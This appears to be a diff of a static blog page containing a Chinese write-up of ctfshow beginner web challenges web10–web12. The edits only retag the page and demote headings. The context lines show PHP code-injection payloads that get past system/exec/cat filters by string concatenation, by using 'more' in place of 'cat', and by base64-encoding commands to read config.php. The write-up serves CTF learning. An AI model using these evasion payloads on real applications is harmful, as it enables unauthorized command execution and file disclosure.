@@ -409,8 +409,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="../../../../tags/ctfshow-%E8%90%8C%E6%96%B0/">
-                                <span class="chip bg-color">ctfshow 萌新</span>
+                            <a href="../../../../tags/ctfshow/">
+                                <span class="chip bg-color">ctfshow</span>
+                            </a>
+                        
+                            <a href="../../../../tags/%E8%90%8C%E6%96%B0/">
+                                <span class="chip bg-color">萌新</span>
                             </a>
                         
                     </div>
@@ -486,15 +490,15 @@
 
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;highlight_file(&#39;config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>这次代码中过滤了system，exec，highlight函数。</p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>这次代码中过滤了system，exec，highlight函数。</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;show_soure(&#39;config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;cat config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p>这次过滤了cat可以继续使用web10中第一种payload。读取文件不只有cat，还有more</p>
+<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>这次过滤了cat可以继续使用web10中第一种payload。读取文件不只有cat，还有more</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;&#39;sys&#39;;$b&#x3D;&#39;tem&#39;;$c&#x3D;$a.$b;$c(&#39;more config.php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p>代码中过滤了cat，.   ,  php,config都过滤了，所以将要传参得内容base64编码，再在地址栏里进行解码</p>
+<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>代码中过滤了cat，.   ,  php,config都过滤了，所以将要传参得内容base64编码，再在地址栏里进行解码</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;$a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);$b&#x3D;base64_decode(&quot;Y2F0IGNvbmZpZy5waHA&#x3D;&quot;);$a($b);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
@@ -561,8 +565,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="../../../../tags/ctfshow-%E8%90%8C%E6%96%B0/">
-                                    <span class="chip bg-color">ctfshow 萌新</span>
+                                <a href="../../../../tags/ctfshow/">
+                                    <span class="chip bg-color">ctfshow</span>
+                                </a>
+                            
+                                <a href="../../../../tags/%E8%90%8C%E6%96%B0/">
+                                    <span class="chip bg-color">萌新</span>
                                 </a>
                             
                         </div>
@@ -767,8 +775,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="../../../../tags/ctfshow-%E8%90%8C%E6%96%B0/">
-                        <span class="chip bg-color">ctfshow 萌新</span>
+                    <a href="../../../../tags/ctfshow/">
+                        <span class="chip bg-color">ctfshow</span>
+                    </a>
+                    
+                    <a href="../../../../tags/%E8%90%8C%E6%96%B0/">
+                        <span class="chip bg-color">萌新</span>
                     </a>
                     
                 </div>
